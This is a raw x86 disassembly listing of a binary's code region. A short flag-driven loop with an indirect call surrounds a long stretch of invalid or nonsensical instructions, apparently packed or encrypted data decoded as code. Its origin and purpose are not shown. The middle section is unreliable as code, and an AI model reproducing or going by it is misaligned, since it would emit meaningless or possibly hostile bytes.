  402087:	mov    DWORD PTR ds:0x42e85a,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e862,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi+0x470dbb51],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x40205e
  4020cf:	clc    
  4020d0:	(bad)  
  4020d1:	xchg   ebp,eax
  4020d2:	pop    esp
  4020d3:	mov    dh,0xc
  4020d5:	mov    edx,DWORD PTR ds:0x90e7470f
  4020db:	rcl    BYTE PTR [eax+0x3a],0xf4
  4020df:	jbe    0x402098
  4020e1:	fst    DWORD PTR [ebx]
  4020e3:	xor    DWORD PTR [eax-0x7a],edx
  4020e6:	and    edx,ebp
  4020e8:	in     eax,dx
  4020e9:	ins    DWORD PTR es:[edi],dx
  4020ea:	call   0x7796b831
  4020ef:	push   es
  4020f0:	mov    eax,ds:0x45e58778
  4020f5:	mov    ch,0x7e
  4020f7:	(bad)  
  4020f8:	sti    
  4020f9:	ret    0x870f
  4020fc:	xchg   ah,dl
  4020fe:	test   eax,0xa20d7805
  402103:	inc    edi
  402104:	and    DWORD PTR [eax-0x5d3e2f3b],ecx
  40210a:	fld    st(4)
  40210c:	pusha  
  40210d:	dec    esp
  40210e:	imul   edx,DWORD PTR [ebx+0x6003d543],0x5d41aca3
  402118:	xchg   dh,dh
  40211a:	call   0x9896:0x5b82eef2
  402121:	and    al,0x1b
  402123:	push   edx
  402124:	fmul   QWORD PTR [eax-0x42]
  402127:	mov    ebp,0xa34f1aa7
  40212c:	mov    cl,0x4d
  40212e:	push   ds
  40212f:	dec    ebx
  402130:	lods   al,BYTE PTR ds:[esi]
  402131:	in     al,dx
  402132:	ficomp WORD PTR [esi+ecx*8]
  402135:	imul   ebp,DWORD PTR [edx+ebp*4],0xffffff97
  402139:	mov    bl,0xed
  40213b:	and    al,0xf4
  40213d:	xor    cl,BYTE PTR [ebx]
  40213f:	repnz adc eax,0x5a177096
  402145:	pop    es
  402146:	xor    ebp,esp
  402148:	lock sbb BYTE PTR [ebp-0x57],dh
  40214c:	pop    edi
  40214d:	jne    0x402184
  40214f:	pop    esp
  402150:	add    al,0xf1
  402152:	jb     0x4021b5
  402154:	call   0xdf9c:0x29710869
  40215b:	sbb    bl,BYTE PTR [ebx+eax*2-0x1bd91eeb]
  402162:	fild   WORD PTR [esi+eax*4]
  402165:	dec    esi
  402166:	in     eax,dx
  402167:	pop    es
  402168:	fdiv   DWORD PTR [ecx+ebp*8+0x261c7718]
  40216f:	jb     0x40210f
  402171:	fisttp WORD PTR [eax+0x11]
  402174:	sar    DWORD PTR [ebx+esi*8-0x40],cl
  402178:	xor    BYTE PTR [ecx],dh
  40217a:	mov    bh,0xf8
  40217c:	cs hlt 
  40217e:	or     dl,al
  402180:	popf   
  402181:	jmp    0x402151
  402183:	sub    eax,0xdc423681
  402188:	mov    esi,0xc1aada88
  40218d:	inc    edx
  40218e:	pop    eax
  40218f:	sub    eax,0xe618c397
  402194:	test   DWORD PTR [ebx-0x50],eax
  402197:	cmp    al,0x1d
  402199:	push   ss
  40219a:	das    
  40219b:	ds add eax,0x27332aa1
  4021a1:	aam    0x4
  4021a3:	inc    edx
  4021a4:	hlt    
  4021a5:	ficom  WORD PTR [eax-0x9]
  4021a8:	cli    
  4021a9:	or     eax,0xff026910
  4021ae:	sbb    ebp,esi
  4021b0:	jmp    0x72e7:0xe369ffb0
  4021b7:	add    DWORD PTR [eax],esp
  4021b9:	xchg   edx,eax
  4021ba:	fwait
  4021bb:	mov    cl,0xdc
  4021bd:	push   cs
  4021be:	xchg   DWORD PTR [edx],esp
  4021c0:	mov    esp,0x905cc415
  4021c5:	popa   
  4021c6:	or     BYTE PTR [edi-0x2081b229],ch
  4021cc:	mov    dh,0xeb
  4021ce:	lea    esp,[ebx+0x23]
  4021d1:	outs   dx,DWORD PTR ds:[esi]
  4021d2:	mov    ah,0x92
  4021d4:	ss xor eax,0x1e7eff68
  4021da:	int    0xab
  4021dc:	sbb    DWORD PTR [eax],esp
  4021de:	mov    ds:0x87c5157c,al
  4021e3:	js     0x402261
  4021e5:	outs   dx,BYTE PTR ds:[esi]
  4021e6:	sbb    cl,bl
  4021e8:	enter  0x110c,0xab
  4021ec:	outs   dx,DWORD PTR ds:[esi]
  4021ed:	scas   eax,DWORD PTR es:[edi]
  4021ee:	mov    bl,0xdc
  4021f0:	neg    DWORD PTR [ebp+0x4edd17f8]
  4021f6:	gs dec ebx
  4021f8:	xchg   ebx,eax
  4021f9:	or     BYTE PTR ds:0x237e96ee,dh
  4021ff:	rol    DWORD PTR [esi],1
  402201:	inc    edx
  402202:	jle    0x402245
  402204:	sbb    al,0x15
  402206:	out    dx,al
  402207:	fwait
  402208:	sbb    DWORD PTR [esi-0x66],edi
  40220b:	clc    
  40220c:	pop    esi
  40220d:	dec    ecx
  40220e:	add    DWORD PTR [ebp-0x7e],esp
  402211:	and    eax,0x580dc5ab
  402216:	add    BYTE PTR [ecx+0x55aac096],al
  40221c:	mov    dl,0xc7
  40221e:	mov    esp,DWORD PTR [ecx-0x4a84126c]
  402224:	cmp    eax,0x107d24af
  402229:	xchg   esi,eax
  40222a:	iret   
  40222b:	mov    esi,0x60680174
  402230:	add    eax,DWORD PTR [edx-0x80]
  402233:	push   ecx
  402234:	mov    ch,0x84
  402236:	jns    0x4022ad
  402238:	call   0xe699:0xa6dedc90
  40223f:	push   0xb
  402241:	enter  0x9add,0x86
  402245:	mov    dl,0x43
  402247:	gs int 0x32
  40224a:	jo     0x402200
  40224c:	data16 fsubp st(5),st
  402250:	xchg   edx,eax
  402251:	jbe    0x402269
  402253:	add    eax,0x441f360c
  402258:	cmp    BYTE PTR [ecx-0x23cfb5d3],al
  40225e:	sub    ebp,DWORD PTR [eax+0x3e6aa1c4]
  402264:	adc    BYTE PTR [ebp+0x23094606],al
  40226a:	sbb    edi,esi
  40226c:	push   ebp
  40226d:	pop    ebp
  40226e:	push   esp
  40226f:	inc    ecx
  402270:	jmp    0x402283
  402272:	pop    eax
  402273:	jle    0x4022a5
  402275:	popf   
  402276:	not    DWORD PTR [edx+0x62]
  402279:	push   ds
  40227a:	cmp    al,0xc8
  40227c:	pushf  
  40227d:	dec    edx
  40227e:	pop    ds
  40227f:	pop    ebp
  402280:	adc    eax,0xfc04ab0c
  402285:	push   cs
  402286:	cmp    DWORD PTR [eax+0x60216d28],eax
  40228c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40228d:	ror    BYTE PTR ds:0xd15b2014,1
  402293:	std    
  402294:	xchg   BYTE PTR [edi+0x64988bd0],dl
  40229a:	gs mov edi,0x4728786c
  4022a0:	jecxz  0x402294
  4022a2:	push   edi
  4022a3:	jmp    0xf203:0x110f05bb
  4022aa:	ret    
  4022ab:	cmp    DWORD PTR [eax-0x13],edx
  4022ae:	cs fisub DWORD PTR ss:0xdde34f6d
  4022b6:	jne    0x402277
  4022b8:	push   ss
  4022b9:	push   edi
  4022ba:	xor    ecx,DWORD PTR [edi-0x2872e502]
  4022c0:	jmpw   0xb608
  4022c4:	jns    0x40229d
  4022c6:	sbb    BYTE PTR [eax+eax*4-0x4d54e6b],0xd
  4022ce:	pop    edi
  4022cf:	cmp    eax,0x528ab801
  4022d4:	dec    ecx
  4022d5:	dec    edi
  4022d6:	stos   DWORD PTR es:[edi],eax
  4022d7:	test   eax,0x84ce2828
  4022dc:	(bad)  
  4022dd:	out    dx,eax
  4022de:	push   edx
  4022df:	pushf  
  4022e0:	ins    DWORD PTR es:[edi],dx
  4022e1:	into   
  4022e2:	inc    ecx
  4022e3:	lods   eax,DWORD PTR ds:[esi]
  4022e4:	push   eax
  4022e5:	mov    dh,0x46
  4022e7:	fistp  DWORD PTR ds:0x24279c3a
  4022ed:	pop    es
  4022ee:	sbb    DWORD PTR [ebx+0x63789db3],esp
  4022f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022f5:	fisttp QWORD PTR [edx]
  4022f7:	lahf   
  4022f8:	jno    0x4022d0
  4022fa:	xacquire xchg DWORD PTR [ebp+0x44849af3],esp
  402301:	pop    es
  402302:	push   esp
  402303:	icebp  
  402304:	mov    ecx,0x70ff2eaf
  402309:	imul   ebp,DWORD PTR [esi-0x356013d8],0xeedf2447
  402313:	xchg   ecx,eax
  402314:	sub    edx,DWORD PTR fs:[edx]
  402317:	push   0x5f
  402319:	ja     0x402308
  40231b:	fld    TBYTE PTR [eax]
  40231d:	mov    ah,0x84
  40231f:	lea    eax,[esi+0x67d3a8ea]
  402325:	lods   eax,DWORD PTR ds:[esi]
  402326:	test   ax,0x7bb9
  40232a:	sti    
  40232b:	xchg   ebp,eax
  40232c:	popa   
  40232d:	add    edi,DWORD PTR [edx-0x27c1bbcc]
  402333:	clc    
  402334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402335:	ja     0x40238e
  402337:	xchg   ebx,eax
  402338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402339:	mov    eax,ds:0x4b3bbdcb
  40233e:	dec    ecx
  40233f:	aas    
  402340:	adc    BYTE PTR [ecx+eax*8+0x4910154f],0x77
  402348:	adc    eax,0xa6fe0979
  40234d:	xchg   ecx,eax
  40234e:	sbb    esi,ebx
  402350:	rol    DWORD PTR [edx],1
  402352:	fstp   DWORD PTR [edx+0x4f]
  402355:	mov    esp,0xe18042bc
  40235a:	mov    ah,0x32
  40235c:	or     esi,edx
  40235e:	pushf  
  40235f:	cmpps  xmm1,XMMWORD PTR [edi],0xd0
  402363:	jg     0x402313
  402365:	mov    ch,0x14
  402367:	inc    ebx
  402368:	xchg   edx,eax
  402369:	jns    0x402316
  40236b:	sub    eax,0xac1f4e7b
  402370:	fucomi st,st(7)
  402372:	lahf   
  402373:	jno    0x402370
  402375:	ror    BYTE PTR [eax],1
  402377:	add    esp,DWORD PTR [esi]
  402379:	push   ds
  40237a:	test   esi,edx
  40237c:	xchg   ecx,eax
  40237d:	call   0xdff557a5
  402382:	fisttp DWORD PTR ds:0x7147fc58
  402388:	sbb    DWORD PTR [ecx+0x50],edx
  40238b:	and    al,0xac
  40238d:	add    ch,ch
  40238f:	cmp    DWORD PTR [ebx],ebx
  402391:	rol    DWORD PTR [esi-0x204c0aa4],0xe6
  402398:	test   al,0x8
  40239a:	lods   al,BYTE PTR ds:[esi]
  40239b:	stos   BYTE PTR es:[edi],al
  40239c:	pop    esp
  40239d:	mov    al,ds:0x9699f535
  4023a2:	ja     0x4023f4
  4023a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023a5:	arpl   WORD PTR [eax+eax*4+0x1d],di
  4023a9:	sbb    esp,DWORD PTR [esi-0x7b]
  4023ac:	repnz and DWORD PTR [edi+0x5b],eax
  4023b0:	arpl   WORD PTR [edx-0x2ec17288],dx
  4023b6:	gs and al,0x98
  4023b9:	jle    0x4023cc
  4023bb:	fsub   QWORD PTR [eax]
  4023bd:	dec    ebx
  4023be:	aad    0x49
  4023c0:	in     al,0x55
  4023c2:	daa    
  4023c3:	jp     0x4023b5
  4023c5:	inc    esp
  4023c6:	das    
  4023c7:	int    0xe0
  4023c9:	aaa    
  4023ca:	repz or DWORD PTR [ebx+0x14],esi
  4023ce:	sub    al,0x70
  4023d0:	add    ebp,0xffffffd1
  4023d3:	cmp    eax,0xb0537ee0
  4023d8:	rol    dh,cl
  4023da:	pop    ds
  4023db:	cmp    BYTE PTR [edx-0x27d75f3d],ch
  4023e1:	cmp    eax,0x6d2ad87e
  4023e6:	rol    esi,0x75
  4023e9:	cs mov dl,0x5c
  4023ec:	jmp    0x733:0xf05bcb61
  4023f3:	pop    edx
  4023f4:	sbb    eax,0xbd4ffa2a
  4023f9:	clc    
  4023fa:	push   esp
  4023fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023fc:	or     BYTE PTR [ebx],0xab
  4023ff:	and    al,0xa1
  402401:	je     0x402439
  402403:	pop    ecx
  402404:	and    al,0x88
  402406:	fwait
  402407:	adc    BYTE PTR [esi+0x7f],bh
  40240a:	xchg   DWORD PTR [esi-0x3b62bb74],eax
  402410:	shr    BYTE PTR [edx+0x52],1
  402413:	cmc    
  402414:	or     eax,0xe1fd5474
  402419:	leave  
  40241a:	xchg   DWORD PTR [esi+0x34],edx
  40241d:	cmp    al,0x69
  40241f:	add    eax,0xe6654254
  402424:	inc    edi
  402425:	jmp    edi
  402427:	and    ah,BYTE PTR [edx-0x29]
  40242a:	mov    BYTE PTR [edi-0x3b31eb98],dh
  402430:	xor    DWORD PTR [esi-0x71],eax
  402433:	sbb    al,0xa2
  402435:	jp     0x40247a
  402437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402438:	inc    edi
  402439:	(bad)  
  40243a:	mov    ds:0x2634eb1,eax
  40243f:	mov    DWORD PTR [edi],ecx
  402441:	fwait
  402442:	mov    ah,0x57
  402444:	xor    al,0x5f
  402446:	xchg   ebx,eax
  402447:	mov    cl,0x95
  402449:	inc    ebp
  40244a:	and    BYTE PTR [edi],cl
  40244c:	pop    esp
  40244d:	push   edx
  40244e:	lods   al,BYTE PTR ds:[esi]
  40244f:	xchg   ebp,eax
  402450:	mov    al,0xfe
  402452:	outs   dx,BYTE PTR ds:[esi]
  402453:	cs scas al,BYTE PTR es:[edi]
  402455:	jge    0x40246a
  402457:	stos   BYTE PTR es:[edi],al
  402458:	xchg   BYTE PTR [ebp+esi*2-0x362014a5],dl
  40245f:	inc    esp
  402460:	ror    ch,0x8b
  402463:	adc    BYTE PTR [ecx-0x2e],ch
  402466:	out    dx,al
  402467:	test   eax,0x5c7f89e
  40246c:	inc    esi
  40246d:	push   es
  40246e:	inc    ebx
  40246f:	add    BYTE PTR [ecx+edi*2+0x0],ah
  402473:	add    BYTE PTR [ecx-0x41fa38f0],cl
  402479:	add    eax,0x76460043
  40247e:	add    BYTE PTR [eax],al
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x4305ba,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	push   eax
  4024b3:	pop    edx
  4024b4:	(bad)  
  4024b5:	call   0x7182:0x7e7e0f52
  4024bc:	jle    0x40253c
  4024be:	repnz daa 
  4024c0:	sub    esp,esp
  4024c2:	sti    
  4024c3:	mov    BYTE PTR [ebx+edx*2],ch
  4024c6:	stc    
  4024c7:	je     0x402524
  4024c9:	sub    DWORD PTR [edx+0x65],eax
  4024cc:	popa   
  4024cd:	sub    DWORD PTR [ecx],ebx
  4024cf:	pop    ebx
  4024d0:	mov    ebx,0x4b494557
  4024d5:	jnp    0x402514
  4024d7:	pop    ecx
  4024d8:	cmp    eax,0xe1aca2af
  4024dd:	sahf   
  4024de:	scas   eax,DWORD PTR es:[edi]
  4024df:	xchg   edx,eax
  4024e0:	(bad)  
  4024e1:	sti    
  4024e2:	sbb    DWORD PTR [edx+0x15b37137],edi
  4024e8:	(bad)  
  4024e9:	cmp    al,0x88
  4024eb:	sbb    DWORD PTR [ecx],eax
  4024ed:	ds dec esi
  4024ef:	aas    
  4024f0:	sub    cl,dl
  4024f2:	mov    WORD PTR [ebp+0x67],?
  4024f5:	jae    0x4024ed
  4024f7:	or     al,0x7d
  4024f9:	push   0xffffffa5
  4024fb:	scas   eax,DWORD PTR es:[edi]
  4024fc:	push   esp
  4024fd:	fcomi  st,st(4)
  4024ff:	xor    bl,BYTE PTR [eax]
  402501:	mov    cl,0x7
  402503:	sub    DWORD PTR [edi*8-0x3a17415b],ecx
  40250a:	outs   dx,DWORD PTR ds:[esi]
  40250b:	test   eax,0x3cf8e668
  402510:	sbb    BYTE PTR [ecx+0x74],cl
  402513:	mov    eax,0x65e00cf5
  402518:	sub    DWORD PTR [eax],eax
  40251a:	push   esi
  40251b:	rcl    ah,1
  40251d:	push   esi
  40251e:	mov    dl,0xed
  402520:	sbb    edx,DWORD PTR [esi-0x23]
  402523:	out    dx,eax
  402524:	adc    dl,BYTE PTR [ebp-0x65]
  402527:	lods   eax,DWORD PTR ds:[esi]
  402528:	sbb    eax,0xf0db5a17
  40252d:	addr16 icebp 
  40252f:	pop    esp
  402530:	pop    esi
  402531:	addr16 jle 0x402503
  402534:	or     DWORD PTR [esi],esp
  402536:	xchg   BYTE PTR [edi-0x6d104e9c],bh
  40253c:	sub    ecx,ebp
  40253e:	mov    ebp,0x6f147ddc
  402543:	imul   esi,esp,0x75ba9aa3
  402549:	outs   dx,BYTE PTR ds:[esi]
  40254a:	scas   eax,DWORD PTR es:[edi]
  40254b:	call   0x7cc771
  402550:	pop    edx
  402551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402552:	dec    edx
  402553:	xchg   BYTE PTR [edx],cl
  402555:	iret   
  402556:	sub    al,0x22
  402558:	push   0xffffffe6
  40255a:	in     al,0xe0
  40255c:	push   ebp
  40255d:	stos   DWORD PTR es:[edi],eax
  40255e:	sbb    BYTE PTR ds:0x5be32542,cl
  402564:	mov    ch,0xbe
  402566:	lods   al,BYTE PTR ds:[esi]
  402567:	pusha  
  402568:	adc    edx,DWORD PTR [edi+edi*1-0x3d]
  40256c:	je     0x402543
  40256e:	cld    
  40256f:	mov    al,0x1b
  402571:	outs   dx,BYTE PTR ds:[esi]
  402572:	cmp    eax,0x73244393
  402577:	or     ebp,ebp
  402579:	ret    0x186f
  40257c:	test   BYTE PTR [ecx],dl
  40257e:	xchg   esi,eax
  40257f:	sub    al,0xa3
  402581:	ret    0x2d3b
  402584:	pop    ebx
  402585:	(bad)  
  402586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402587:	(bad)  
  402589:	ret    0xb407
  40258c:	add    ebp,0x75745940
  402592:	(bad)  
  402593:	push   ecx
  402594:	jne    0x4025a0
  402596:	jle    0x402520
  402598:	adc    ah,dl
  40259a:	adc    BYTE PTR [ebx+0x773359ca],cl
  4025a0:	hlt    
  4025a1:	es retf 
  4025a3:	jmp    0x4025fa
  4025a5:	mov    ah,0x25
  4025a7:	pop    esi
  4025a8:	sti    
  4025a9:	pop    ss
  4025aa:	aam    0x7b
  4025ac:	mov    ds:0x55c4b1e4,eax
  4025b1:	mov    dl,0xeb
  4025b3:	xor    eax,DWORD PTR ds:0x924d4f9a
  4025b9:	(bad)  
  4025ba:	stc    
  4025bb:	cmp    BYTE PTR [edx+0x17],0x98
  4025bf:	mov    al,BYTE PTR [eax+eax*4]
  4025c2:	add    edx,ecx
  4025c4:	rcl    BYTE PTR [ecx],1
  4025c6:	mov    ds:0x57e5d40c,eax
  4025cb:	xchg   ebx,eax
  4025cc:	stos   BYTE PTR es:[edi],al
  4025cd:	mov    ch,0x95
  4025cf:	mov    al,ds:0x879b95d
  4025d4:	cmp    eax,0xa852a830
  4025d9:	sub    DWORD PTR [eax],edx
  4025db:	aad    0xa2
  4025dd:	or     al,0xb6
  4025df:	in     eax,dx
  4025e0:	stos   BYTE PTR es:[edi],al
  4025e1:	xor    DWORD PTR gs:[eax-0x53dec80c],ebx
  4025e8:	rol    BYTE PTR [esi-0x75],cl
  4025eb:	hlt    
  4025ec:	jmp    0x5da81170
  4025f1:	aaa    
  4025f2:	jns    0x4025af
  4025f4:	push   0x33fb4949
  4025f9:	in     al,0xf7
  4025fb:	arpl   WORD PTR [ebp-0x3c4a03ba],di
  402601:	ret    0xf51
  402604:	and    al,BYTE PTR [edx+0x37d9734d]
  40260a:	inc    esi
  40260b:	jb     0x4025a5
  40260d:	dec    edx
  40260e:	mov    esi,DWORD PTR [edi-0x6a3ce774]
  402614:	stos   DWORD PTR es:[edi],eax
  402615:	sbb    eax,0x86eaa308
  40261a:	cli    
  40261b:	test   eax,0x748a6f07
  402620:	cmp    bh,bl
  402622:	or     al,0x87
  402624:	xchg   edi,eax
  402625:	inc    edi
  402626:	fisttp QWORD PTR [edx-0x1a7217b5]
  40262c:	inc    edi
  40262d:	loopne 0x4025e3
  40262f:	jg     0x4025ca
  402631:	pop    edx
  402632:	mov    ecx,0xade488f7
  402637:	pop    edi
  402638:	outs   dx,BYTE PTR ds:[esi]
  402639:	sahf   
  40263a:	outs   dx,DWORD PTR ds:[esi]
  40263b:	sbb    DWORD PTR [esi+0x2f7965c1],0x2a0ab86e
  402645:	js     0x4025ff
  402647:	mov    esp,0x74fd33a
  40264c:	or     al,0x1e
  40264e:	fstp   DWORD PTR [ecx+0x45]
  402651:	or     ah,ah
  402653:	pop    edi
  402654:	xor    ch,dh
  402656:	mov    ebp,0x32b74350
  40265b:	jae    0x4025e3
  40265d:	jne    0x402659
  40265f:	sbb    BYTE PTR [ecx+0x58],0x23
  402663:	add    al,0x29
  402665:	inc    esp
  402666:	adc    bh,ah
  402668:	div    DWORD PTR [ebp-0x606c437e]
  40266e:	lods   eax,DWORD PTR ds:[esi]
  40266f:	(bad)  
  402670:	xchg   esp,eax
  402671:	dec    ebp
  402672:	mov    bl,BYTE PTR [ebx]
  402674:	inc    ecx
  402675:	(bad)  
  402676:	jnp    0x40268c
  402678:	jge    0x402657
  40267a:	(bad)  
  40267b:	mov    ds:0x649d4ac1,al
  402680:	cmp    eax,0x7e13d6b2
  402685:	fwait
  402686:	pop    ss
  402687:	mov    cl,0x5
  402689:	loopne 0x4026b3
  40268b:	mov    bl,0x8d
  40268d:	fimul  DWORD PTR [edx+0x4d]
  402690:	mov    ch,0xfe
  402692:	bound  esp,QWORD PTR [edi]
  402694:	sub    edx,DWORD PTR [ebx+eax*4+0x12]
  402698:	jmp    0xcd4e:0x1d3e7ae0
  40269f:	(bad)  
  4026a0:	pop    eax
  4026a1:	pop    ds
  4026a2:	mov    edx,0x6955cd33
  4026a7:	aad    0x36
  4026a9:	in     eax,0x5b
  4026ab:	sbb    DWORD PTR [ecx-0x46],esi
  4026ae:	mov    es:0x88dd7ff8,al
  4026b4:	cs and al,0x2b
  4026b7:	rol    BYTE PTR [ecx],0xda
  4026ba:	(bad)  
  4026bb:	cmp    al,0x4f
  4026bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026be:	add    BYTE PTR [esi],dh
  4026c0:	and    al,0x44
  4026c2:	int    0xb9
  4026c4:	mov    ebp,0xb9f42f12
  4026c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026ca:	cli    
  4026cb:	push   eax
  4026cc:	ja     0x40266e
  4026ce:	out    0xd0,eax
  4026d0:	sahf   
  4026d1:	les    edx,FWORD PTR [esp+ebx*4-0x31]
  4026d5:	lahf   
  4026d6:	test   al,0xe3
  4026d8:	push   ds
  4026d9:	lods   al,BYTE PTR ds:[esi]
  4026da:	xchg   esp,eax
  4026db:	adc    BYTE PTR [edi+eax*4-0x45],0x2d
  4026e0:	sub    dl,BYTE PTR [ebx+0x3d5ef552]
  4026e6:	stos   BYTE PTR es:[edi],al
  4026e7:	push   esp
  4026e8:	dec    esi
  4026e9:	dec    ebp
  4026ea:	mov    ah,0x38
  4026ec:	jbe    0x4026c6
  4026ee:	dec    ecx
  4026ef:	pop    ds
  4026f0:	xchg   BYTE PTR [ebx-0x6ff06f35],al
  4026f6:	mov    cl,0x6b
  4026f8:	std    
  4026f9:	es shl dh,1
  4026fc:	fisttp DWORD PTR [edi]
  4026fe:	sbb    al,0x53
  402700:	sub    al,0xd1
  402702:	push   edi
  402703:	pop    edi
  402704:	sahf   
  402705:	sub    eax,0x5795b8c5
  40270a:	imul   esp,DWORD PTR [edi+0x405dc475],0xce5317b5
  402714:	retf   
  402715:	mov    BYTE PTR gs:[eax+0x32],dl
  402719:	mov    cl,0xa6
  40271b:	dec    ebp
  40271c:	loope  0x402787
  40271e:	aaa    
  40271f:	in     eax,dx
  402720:	add    eax,0x4efadf2e
  402725:	rsm    
  402727:	dec    esi
  402728:	out    0xd5,eax
  40272a:	bnd jmp 0x4026fc
  40272d:	call   0x3af9:0x387c1aa7
  402734:	(bad)  
  402736:	rcl    BYTE PTR [eax+esi*1-0x49b8d0f2],0x88
  40273e:	mov    eax,0x9c06a020
  402743:	outs   dx,BYTE PTR ds:[esi]
  402744:	xor    ebx,edi
  402746:	mov    edx,gs
  402748:	aaa    
  402749:	fs scas eax,DWORD PTR es:[edi]
  40274b:	fxch   st(6)
  40274d:	cwde   
  40274e:	daa    
  40274f:	xor    bh,bh
  402751:	mov    BYTE PTR [edx+0x46],0xd6
  402755:	dec    eax
  402756:	xlat   BYTE PTR ds:[ebx]
  402757:	adc    ebx,DWORD PTR [ebx-0x5]
  40275a:	arpl   WORD PTR [esi-0x302acecc],dx
  402760:	es call 0x6d8428de
  402766:	enter  0xbf23,0x59
  40276a:	jb     0x4027b2
  40276c:	jmp    0xdfec:0x34d863aa
  402773:	cmp    bh,BYTE PTR [edx+0x4d]
  402776:	test   BYTE PTR [ebx-0x61ea66de],dh
  40277c:	in     al,0xf3
  40277e:	add    DWORD PTR [esi-0x44],esi
  402781:	clc    
  402782:	inc    edi
  402783:	cmp    eax,0xf6f392c9
  402788:	or     al,BYTE PTR [eax]
  40278a:	sub    DWORD PTR [edx+0x27567fd2],0xfffffffa
  402791:	outs   dx,DWORD PTR ds:[esi]
  402792:	and    ebp,DWORD PTR [ecx+0x598e3a88]
  402798:	cmp    DWORD PTR [ebp-0x71790619],0x317fc748
  4027a2:	mov    ch,BYTE PTR [ebp+0x3739d2d2]
  4027a8:	dec    esi
  4027a9:	shl    dl,1
  4027ab:	mov    dh,0xe
  4027ad:	popf   
  4027ae:	cmp    cl,BYTE PTR [edx-0x21b52425]
  4027b4:	mov    dl,0xc8
  4027b6:	pop    es
  4027b7:	dec    ebx
  4027b8:	pop    esp
  4027b9:	dec    eax
  4027ba:	(bad)  
  4027bb:	repnz pushf 
  4027bd:	xor    bh,BYTE PTR [esp+ecx*2-0x22]
  4027c1:	(bad)  
  4027c2:	aad    0x26
  4027c4:	scas   al,BYTE PTR es:[edi]
  4027c5:	aad    0xf
  4027c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027c8:	mov    dl,0x39
  4027ca:	repz sub DWORD PTR [edi+eiz*1],edx
  4027ce:	mov    ch,0x8d
  4027d0:	in     al,0x45
  4027d2:	call   0xd367b4d9
  4027d7:	packsswb mm6,mm0
  4027da:	sbb    BYTE PTR [edi-0x1a84e539],bh
  4027e0:	jle    0x4027f8
  4027e2:	retf   0x7cd6
  4027e5:	cmp    eax,0x398544db
  4027ea:	sbb    al,0xab
  4027ec:	push   esi
  4027ed:	fild   QWORD PTR [edi-0x43]
  4027f0:	and    BYTE PTR [eax-0xd],dl
  4027f3:	fwait
  4027f4:	mov    dl,0x4f
  4027f6:	jl     0x4027b3
  4027f8:	jae    0x4027da
  4027fa:	fild   WORD PTR [ebx-0x9]
  4027fd:	js     0x402803
  4027ff:	cli    
  402800:	sub    eax,0xebc290eb
  402805:	push   0x7080056b
  40280a:	xor    DWORD PTR [esi-0x47],esp
  40280d:	inc    edi
  40280e:	aas    
  40280f:	and    DWORD PTR [edx+0x2d],0xffffffd3
  402813:	push   es
  402814:	push   edx
  402815:	mul    BYTE PTR [edi+eax*4]
  402818:	ret    0xf9b5
  40281b:	xchg   ecx,eax
  40281c:	sbb    dl,BYTE PTR [edi+eiz*8-0x6f]
  402820:	or     al,0x93
  402822:	inc    BYTE PTR [edx]
  402824:	mov    ebp,0x58fc546f
  402829:	jge    0x40289d
  40282b:	push   cs
  40282c:	inc    ebp
  40282d:	cmp    edx,DWORD PTR [ebp+0x7bca4b9f]
  402833:	test   al,0x13
  402835:	inc    ebp
  402836:	fld    TBYTE PTR [esi+0x5c]
  402839:	push   ds
  40283a:	in     al,0xe
  40283c:	xchg   edx,eax
  40283d:	(bad)  
  40283e:	imul   esi,DWORD PTR [ebx+0x79],0x8a13d41a
  402845:	mov    bh,0x47
  402847:	shr    eax,0x23
  40284a:	sub    al,bl
  40284c:	jg     0x402869
  40284e:	dec    edi
  40284f:	ret    0xba9b
  402852:	or     DWORD PTR [eax],0x60751c9e
  402858:	mov    DWORD PTR ds:0x42e85e,0x14
  402862:	cmp    DWORD PTR ds:0x42e85e,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e85e,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42ead8
  402885:	cmp    DWORD PTR ds:0x42e85e,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e85e
  40289a:	dec    eax
  40289b:	mov    ds:0x42e85e,eax
  4028a0:	mov    eax,ds:0x42e85e
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e85e,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
